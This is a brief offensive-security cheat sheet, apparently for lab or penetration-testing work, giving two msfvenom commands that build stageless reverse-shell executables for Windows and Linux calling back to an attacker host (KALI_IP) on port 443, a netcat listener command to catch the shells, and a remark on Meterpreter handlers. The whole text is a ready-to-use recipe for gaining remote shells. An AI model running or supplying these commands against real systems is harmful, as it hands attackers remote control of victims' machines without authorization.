## Commands

**Kali**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.elf
```

These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.
